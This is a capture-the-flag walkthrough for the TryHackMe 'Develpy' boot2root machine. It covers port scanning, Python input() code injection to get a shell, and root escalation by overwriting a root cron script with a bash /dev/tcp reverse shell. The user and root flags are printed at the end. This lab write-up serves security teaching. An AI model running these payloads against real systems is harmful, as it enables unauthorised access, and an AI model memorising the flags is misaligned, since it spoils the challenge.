# Develpy

boot2root machine for FIT and bsides Guatemala CTF

[Develpy](https://tryhackme.com/room/bsidesgtdevelpy)

## Topic's

* Network Enumeration
* Code Injection (RCE)
* Exploiting Crontab

## Task 1 Develpy

read user.txt and root.txt

```
kali@kali:~/CTFs/tryhackme/Develpy$ sudo nmap -A -sS -sC -sV -O -p- 10.10.120.12
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 20:54 CEST
Nmap scan report for 10.10.120.12
Host is up (0.034s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.80%I=7%D=10/15%Time=5F889B14%P=x86_64-pc-linux-gnu%r(
SF:NULL,48,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x
SF:20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20")
SF:%r(GetRequest,136,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days
SF:\r\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\
SF:?\?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20Fil
SF:e\x20\"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x2
SF:0\x20num_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x
SF:20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<stri
SF:ng>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'GET'\x
SF:20is\x20not\x20defined\r\n")%r(HTTPOptions,13A,"\r\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20
SF:of\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20c
SF:all\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20
SF:in\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x2
SF:0Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)
SF:\)\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\n
SF:NameError:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSPReq
SF:uest,13A,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\
SF:x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20T
SF:raceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"\.
SF:/exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\x20num_
SF:exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20of\x20e
SF:xploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string>\",\x2
SF:0line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20is\
SF:x20not\x20defined\r\n")%r(GenericLines,13B,"\r\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of\x
SF:20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20call\
SF:x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in\x
SF:20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20Ple
SF:ase\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r
SF:\n\x20\x20File\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n\x2
SF:0\x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20parsin
SF:g\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/15%OT=22%CT=1%CU=38173%PV=Y%DS=2%DC=T%G=Y%TM=5F889B
OS:97%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   34.19 ms 10.8.0.1
2   34.65 ms 10.10.120.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.85 seconds
```

[view-source:http://10.10.120.12:10000/](view-source:http://10.10.120.12:10000/)

```

        Private 0days

 Please enther number of exploits to send??: Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'GET' is not defined

```

```
ali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000

        Private 0days

 Please enther number of exploits to send??: 2

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.041 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.055 ms
kali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000

        Private 0days

 Please enther number of exploits to send??: "a"    
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
ValueError: invalid literal for int() with base 10: 'a'
kali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000

        Private 0days

 Please enther number of exploits to send??: 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111

Exploit started, attacking target (tryhackme.com)...
Traceback (most recent call last):
  File "./exploit.py", line 9, in <module>
    for i in range(num_exploits):
OverflowError: range() result has too many items
kali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000

        Private 0days

 Please enther number of exploits to send??: eval(1)
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
TypeError: eval() arg 1 must be a string or code object
kali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000

        Private 0days

 Please enther number of exploits to send??: eval("1")

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.020 ms
kali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000

        Private 0days

 Please enther number of exploits to send??: eval ("1+1")

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.032 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.094 ms
kali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('bash')
bash: cannot set terminal process group (759): Inappropriate ioctl for device
bash: no job control in this shell
king@ubuntu:~$ whoami
king
king@ubuntu:~$ pwd
/home/king
king@ubuntu:~$ ls
credentials.png  exploit.py  root.sh  run.sh  user.txt
king@ubuntu:~$ cat user.txt
cf85ff769cfaaa721758949bf870b019
king@ubuntu:~$
```

```
king@ubuntu:~$ sudo -l
sudo: no tty present and no askpass program specified
king@ubuntu:~$ id
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
king@ubuntu:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
#
king@ubuntu:~$ ls
credentials.png  exploit.py  root.sh  run.sh  user.txt
king@ubuntu:~$ rm -rf root.sh
king@ubuntu:~$ ls
credentials.png  exploit.py  run.sh  user.txt
king@ubuntu:~$ echo "bash -i >& /dev/tcp/10.8.106.222/4444 0>&1" > root.sh
```

```
kali@kali:~/CTFs/tryhackme/Develpy$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.120.12] 47824
bash: cannot set terminal process group (1227): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/king# cd /root
cd /root
root@ubuntu:~# ls
ls
company
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
9c37646777a53910a347f387dce025ec
```

1. user.txt

`cf85ff769cfaaa721758949bf870b019`

2. root.txt

`9c37646777a53910a347f387dce025ec`
